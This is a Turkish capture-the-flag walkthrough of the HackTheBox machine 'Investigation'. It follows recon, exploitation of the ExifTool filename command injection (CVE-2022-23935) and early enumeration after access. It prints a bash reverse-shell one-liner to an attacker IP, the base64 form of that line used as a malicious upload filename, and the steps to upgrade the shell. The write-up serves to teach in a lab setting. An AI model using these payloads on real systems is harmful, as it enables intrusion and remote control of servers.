---
{"dg-publish":true,"permalink":"/ctf/investigation/"}
---


![Pasted image 20250108190926.png](/img/user/Pasted%20image%2020250108190926.png)


Araştırma, kullanıcıların resim yüklemesine izin veren ve bu resimlerde [[Exiftool\|Exiftool]] çalıştıran bir web sitesiyle başlıyor. Kullanılan sürümde bir komut enjeksiyonu zafiyeti var. Bu zafiyeti inceleyecek ve ardından bir başlangıç erişimi elde etmek için istismar edeceğim. Daha sonra bir dizi **Windows olay günlüğü** bulup bunları analiz ederek bir parola çıkaracağım. Son olarak, **root** olarak çalışan bir kötü amaçlı yazılım bulup, bunu anlamaya çalışarak komut yürütme elde edeceğim.

## Box Info

|Name|[Investigation](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Finvestigation)[![Investigation](https://0xdf.gitlab.io/icons/box-investigation.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Finvestigation)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Finvestigation)|
|---|---|
|Release Date|[21 Jan 2023](https://twitter.com/hackthebox_eu/status/1616103239899914240)|
|Retire Date|22 Apr 2023|
|OS|Linux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)|
|Base Points|Medium [30]|
|Rated Difficulty|![Rated difficulty for Investigation](https://0xdf.gitlab.io/img/investigation-diff.png)|
|Radar Graph|![Radar chart for Investigation](https://0xdf.gitlab.io/img/investigation-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|00:17:46[![jkr](https://www.hackthebox.com/badge/image/77141)](https://app.hackthebox.com/users/77141)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|00:23:49[![xct](https://www.hackthebox.com/badge/image/13569)](https://app.hackthebox.com/users/13569)|
|Creator|[![Derezzed](https://www.hackthebox.com/badge/image/15515)](https://app.hackthebox.com/users/15515)|

## Recon

### nmap

nmap iki açık TCP portu bulur, SSH (22) ve HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.197
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-18 07:03 EDT
Nmap scan report for 10.10.11.197
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.197
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-18 07:03 EDT
Nmap scan report for 10.10.11.197
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://eforenzics.htb/
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
```

[OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) ve [Apache](https://packages.ubuntu.com/search?keywords=apache2) sürümlerine göre, host muhtemelen Ubuntu 20.04 focal çalıştırıyor.

Port 80'de eforenzics.htb'ye bir yönlendirme var. Farklı yanıt veren herhangi bir subdomain aramak için wfuzz kullanacağım, ancak hiçbir şey bulamadım. Bunu hosts dosyama ekleyeceğim:

```
10.10.11.197 eforenzics.htb
```


### Website - TCP 80

#### Site

Site bir forensics  şirketi için:

![Pasted image 20250108192122.png](/img/user/Pasted%20image%2020250108192122.png)

Sayfadaki tüm linkler, /service.html adresine gidenler hariç, sayfadaki diğer linklere gitmektedir. Bu sayfa özellikle JPG dosyaları üzerinde “Image Forensics” sunmaktadır:

![Pasted image 20250108192220.png](/img/user/Pasted%20image%2020250108192220.png)

Bir JPG verdiğinizde, bir “report” için bir link sunuyor:

![Pasted image 20250108192253.png](/img/user/Pasted%20image%2020250108192253.png)

Bu report `[özel karakterler kaldırılmış orijinal dosya adı].txt` şeklindedir. Yani htb.jpg, htbjpg.txt olur:

```
ExifTool Version Number         : 12.37
File Name                       : htb.jpg
Directory                       : .
File Size                       : 6.3 KiB
File Modification Date/Time     : 2023:04:18 12:42:04+00:00
File Access Date/Time           : 2023:04:18 12:42:04+00:00
File Inode Change Date/Time     : 2023:04:18 12:42:04+00:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 200
Image Height                    : 200
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 200x200
Megapixels                      : 0.040
```

Bu Exiftool'un [çıktısıdır](https://exiftool.org/).


#### Tech Stack

Sitedeki sayfalar **index.html** ve **services.html**. Ancak, bir görüntü yüklediğimde **upload.php**'ye gidiyor, yani site çoğunlukla statik sayfalardan oluşan bir PHP sitesi.

Yukarıda belirtildiği gibi, görüntülerdeki **`metadata`** bilgilerini almak için **Exiftool** kullanılıyor ve çıktı, kullanılan sürümün **12.37** olduğunu gösteriyor.

#### Directory Brute Force

Feroxbuster'ı siteye karşı çalıştıracağım ve -x php,html ekleyeceğim:

```
oxdf@hacky$ feroxbuster -u http://eforenzics.htb -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://eforenzics.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      208l      629w    10957c http://eforenzics.htb/index.html
200      GET       82l      198w     3773c http://eforenzics.htb/upload.php
301      GET        9l       28w      317c http://eforenzics.htb/assets => http://eforenzics.htb/assets/
200      GET    10598l    42768w   280364c http://eforenzics.htb/assets/vendors/jquery/jquery-3.4.1.js
200      GET     1081l     1807w    16450c http://eforenzics.htb/assets/vendors/themify-icons/css/themify-icons.css
200      GET       32l       73w      780c http://eforenzics.htb/assets/js/efore.js
200      GET      162l      483w     4838c http://eforenzics.htb/assets/vendors/bootstrap/bootstrap.affix.js
200      GET      208l      629w    10957c http://eforenzics.htb/
200      GET       91l      227w     4335c http://eforenzics.htb/service.html
200      GET       76l      475w    36057c http://eforenzics.htb/assets/imgs/avatar3.jpg
200      GET       48l      247w    20651c http://eforenzics.htb/assets/imgs/avatar2.jpg
301      GET        9l       28w      321c http://eforenzics.htb/assets/css => http://eforenzics.htb/assets/css/
301      GET        9l       28w      320c http://eforenzics.htb/assets/js => http://eforenzics.htb/assets/js/
200      GET    11691l    23373w   242712c http://eforenzics.htb/assets/css/efore.css
200      GET     7013l    22369w   222911c http://eforenzics.htb/assets/vendors/bootstrap/bootstrap.bundle.js
200      GET       61l      353w    29810c http://eforenzics.htb/assets/imgs/avatar1.jpg
301      GET        9l       28w      322c http://eforenzics.htb/assets/imgs => http://eforenzics.htb/assets/imgs/
[####################] - 3m    645225/645225  0s      found:17      errors:177145 
[####################] - 3m    129024/129024  691/s   http://eforenzics.htb/ 
[####################] - 3m    129024/129024  693/s   http://eforenzics.htb/assets/ 
[####################] - 3m    129024/129024  696/s   http://eforenzics.htb/assets/js/ 
[####################] - 3m    129024/129024  692/s   http://eforenzics.htb/assets/css/ 
[####################] - 3m    129024/129024  689/s   http://eforenzics.htb/assets/imgs/ 
```

Birkaç tane var ama ilginç bir şey yok.

## Shell as www-data

### CVE-2022-23935

#### Identify

Google'da “exiftool 12.37” araması yapıldığında, en üstteki sonuç 12.38'den önce Exiftool'daki bir command injection açığı ile ilgilidir:

![Pasted image 20250108193013.png](/img/user/Pasted%20image%2020250108193013.png)

Sorun, bu [gist](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)'te açıklandığı gibi, Perl'in `open` komutuyla "|" karakteriyle biten dosya adlarını nasıl işlediğiyle ilgilidir. [Pikaboo](https://0xdf.gitlab.io/2021/12/04/htb-pikaboo.html#exploit-cvsupdate)'da, Perl'in `<>` operatörünü kullanan bir script'e bunu kötüye kullanma sürecini adım adım anlatmıştım. Bu operatör, içinde bir `open` çağrısını da içeren bir kısayoldur. Exiftool, Perl ile yazılmıştır ve 12.38 sürümünden önce, dosya adının (kullanıcı tarafından kontrol edilen) komut yürütme sağlamak için kullanılabileceği gerçeğini gözden kaçırıyordu.

Exiftool'da [Meta](https://0xdf.gitlab.io/2022/06/11/htb-meta.html#exiftool-exploit)'da kullandığım farklı bir CVE var, CVE-2021-22204. Bu, dosya adını değil meta verileri zehirlemeyi içeriyordu.

#### Vulnerability Details

Bu bölümdeki hiçbir şey, _Investigation_ (Araştırma) sömürüsüne devam etmek için gerekli değildir. Gist, ilerleyebileceğim bir _Proof of Concept_ (POC) sağlıyor, ancak yine de güvenlik açıklarının nasıl çalıştığını anlamak ilginç ve değerlidir. Bunu bu [videoda](https://www.youtube.com/watch?v=UiRx1Zkeqzg) inceleyeceğim:

Özet noktalar şunlardır:

- `open` ile geçirilen bir dosya adı `|` karakteriyle bitiyorsa, `|` öncesindeki string bir komut olarak çalıştırılır ve komutun çıktısı (STDOUT’a gönderilen) oluşturulan file handle'ından okunur.
- Exiftool, `.gz` veya `.bz2` uzantılı bir dosya tespit ettiğinde, dosya adını sıkıştırmayı açacak bir komut içerecek şekilde değiştirir ve çıktıyı işler. Örneğin, `.gz` dosyaları şu hale gelir: `gzip -dc "$file" |`.
- Daha sonra, Exiftool dosyayı açarken, `|` karakterini açıkça kontrol eder ve çalıştırmaya izin veren modda açılıp açılmayacağını belirler.
- Eğer bir dosya adı `|` ile bitiyorsa ve bu dosya Exiftool ile çalıştırılırsa, dosya adı bir komut olarak yorumlanır ve çalıştırılır.


### RCE

#### POC

Bunu test etmek için, Burp Proxy geçmişinde bir image gönderdiğim HTTP isteğini bulacağım ve bunu Repeater'a göndereceğim:

![Pasted image 20250108193656.png](/img/user/Pasted%20image%2020250108193656.png)


Dosya adı form data meta verilerinde ayarlanmıştır. Bunu ping -c 10.10.14.6| olarak değiştireceğim ve ICMP'yi dinlemek için tcpdump'ı başlatacağım. İstek gönderildiğinde, bir ICMP paketi geri geliyor:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:51:18.487116 IP 10.10.11.197 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
12:51:18.487125 IP 10.10.14.6 > 10.10.11.197: ICMP echo reply, id 2, seq 1, length 64
```

Bu, Investigation kod yürütme.


#### Shell

Bir shell elde etmek için, [bash reverse shell'i](https://www.youtube.com/watch?v=OjkVep2EIlw) deneyeceğim. Muhtemelen gerekli özel karakterler nedeniyle ham formda çalışmıyor. Shell'i base64-encode edeceğim, özel karakterler kalmayana kadar fazladan boşluklarla uğraşacağım (her zaman gerekli değildir, ancak yardımcı olabilir):

```
oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==

oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1 ' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIAo=

oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1  ' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxICAK
```

Kısaca = ifadesini olmamasını istiyoruz . 

Şimdi bunu dosya adı olarak göndereceğim:

![Pasted image 20250108194133.png](/img/user/Pasted%20image%2020250108194133.png)

Takılıyor, ama dinleme nc'sinde bir shell var:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 37680
bash: cannot set terminal process group (960): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1681837009$
```

Shell'i [standart numara](https://www.youtube.com/watch?v=DqE6DxqJg8Q) ile yükselteceğim:

```
www-data@investigation:~/uploads/1681837009$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@investigation:~/uploads/1681837009$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@investigation:~/uploads/1681837009$
```


## Shell as smorton

### Enumeration

#### smorton

Kutuda tek bir home dizini var ve www-data buna erişemiyor:

```
www-data@investigation:/$ ls /home/
smorton
www-data@investigation:/$ cd /home/smorton/
bash: cd: /home/smorton/: Permission denied
```

Dosya sisteminde başka ilginç bir şey yok. Smorton'a ait dosyalara bakacağım:

```
www-data@investigation:/$ find / -user smorton 2>/dev/null
/home/smorton
/usr/local/investigation/Windows Event Logs for Analysis.msg
```

Investigation dizini, daha fazla incelemeye değer.

#### investigation Directory

Dizinde iki dosya bulunmaktadır:

```
www-data@investigation:/usr/local/investigation$ ls -l
total 1280
-rw-rw-r-- 1 smorton  smorton  1308160 Oct  1  2022 'Windows Event Logs for Analysis.msg'
-rw-rw-r-- 1 www-data www-data       0 Oct  1  2022  analysed_log
```

`analysed_log` her zaman 0 byte. Aslında, her beş dakikada bir çalışıp görüntüleri ve analizleri temizlemeden önce buna yazması gereken bir cron işi var, ve bu cron işi `www-data` kullanıcısı tarafından çalıştırılıyor.

```
www-data@investigation:/usr/local/investigation$ crontab -l
...[snip]...
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
```

Sorun şu ki, bir şekilde analysed_log sabit olarak ayarlanmış:

```
www-data@investigation:/usr/local/investigation$ lsattr analysed_log 
-u--i---------e----- analysed_log
```

Bu yüzden cron ona yazmaya çalıştığında başarısız olur:

---


`lsattr analysed_log` komutu, **analysed_log** dosyasının dosya özelliklerini listelemek için kullanılır. Bu komut, dosyanın sahip olduğu **dosya sisteminin özelliklerini** (attributelerini) gösterir.

Özellikle, dosyaların üzerine yazma, silme veya değiştirme gibi işlemleri engelleyen bazı özellikler olabilir. Örneğin:

- **i**: Dosya, değiştirilmeden yalnızca okunabilir. Yani, üzerine yazılamaz veya silinemez.
- **a**: Dosyaya yalnızca ekleme yapılabilir, üzerine yazılamaz.
- **d**: Dosya silinemez.
- **e**: Dosya bir ext4 dosya sistemi üzerinde "extent" (genişletilmiş) özellikleri kullanıyordur.

Bu komutla, dosyanın üzerinde herhangi bir dosya sistemi kısıtlamasının olup olmadığını kontrol edebilirsiniz. Eğer dosya **"immutable"** (değiştirilemez) gibi bir özellik taşıyorsa, cron işi dosyaya yazma yapamayabilir.


---

